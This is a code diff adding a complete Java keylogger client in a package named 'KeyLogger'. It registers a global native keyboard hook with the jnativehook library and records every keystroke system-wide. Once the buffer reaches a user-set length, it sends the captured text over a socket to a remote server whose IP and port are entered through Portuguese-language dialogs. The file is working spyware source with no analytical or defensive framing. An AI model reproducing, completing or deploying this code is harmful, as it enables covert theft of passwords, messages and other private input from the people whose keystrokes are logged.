@@ -1,0 +1,97 @@
+package KeyLogger;
+
+import java.io.*;
+import java.net.*;
+
+import javax.swing.JOptionPane;
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+public class Client implements NativeKeyListener {
+
+	static int port;
+	static int maxSizeKByte;
+	static String ip;
+	static String txt = "";
+
+	public static void main(String[] args) {
+
+		port = Integer.parseInt(JOptionPane.showInputDialog("Entre com a porta"));
+		ip = (JOptionPane.showInputDialog("Entre com o ip do servidor"));
+		maxSizeKByte = Integer.parseInt(JOptionPane.showInputDialog("Entre com o valor máximo em KB"));
+
+		try {
+			GlobalScreen.registerNativeHook();
+		} catch (NativeHookException e) {
+			e.printStackTrace();
+		}
+
+		GlobalScreen.addNativeKeyListener(new Client());
+	}
+
+	@Override
+	public void nativeKeyPressed(NativeKeyEvent key) {
+
+		int k = key.getKeyCode();
+
+		if (k == NativeKeyEvent.VC_ENTER) {
+			txt += "\n";
+		} else if (k == NativeKeyEvent.VC_SPACE) {
+			txt += " ";
+		} else if (k == NativeKeyEvent.VC_BACKSPACE) {
+			StringBuilder sb = new StringBuilder(txt);
+			txt = String.valueOf(sb.deleteCharAt(txt.length()-1));
+		} else if (k == NativeKeyEvent.VC_COMMA) {
+			txt += ",";
+		} else if (k == NativeKeyEvent.VC_PERIOD) {
+			txt += ".";
+		} else if (k == NativeKeyEvent.VC_SEMICOLON) {
+			txt += ";";
+		} else {
+			txt += (NativeKeyEvent.getKeyText(k)).toLowerCase();
+		}
+
+		if (txt.length() == maxSizeKByte) {
+			sendToServer(ip, port);
+		}
+
+	}
+
+	@Override
+	public void nativeKeyReleased(NativeKeyEvent tecla) {
+
+	}
+
+	@Override
+	public void nativeKeyTyped(NativeKeyEvent e1) {
+
+	}
+
+	public static void sendToServer(String host, int port) {
+
+		try {
+
+			Socket socket = new Socket(host, port);
+
+			ObjectOutputStream output = new ObjectOutputStream(socket.getOutputStream());
+			ObjectInputStream input = new ObjectInputStream(socket.getInputStream());
+
+			output.writeUTF(txt);
+			output.flush();
+
+			String returned = input.readUTF();
+			System.out.println(returned);
+
+			txt = "";
+			input.close();
+			output.close();
+			socket.close();
+
+		} catch (Exception e) {
+			System.out.println(e.getMessage());
+		}
+	}
+}
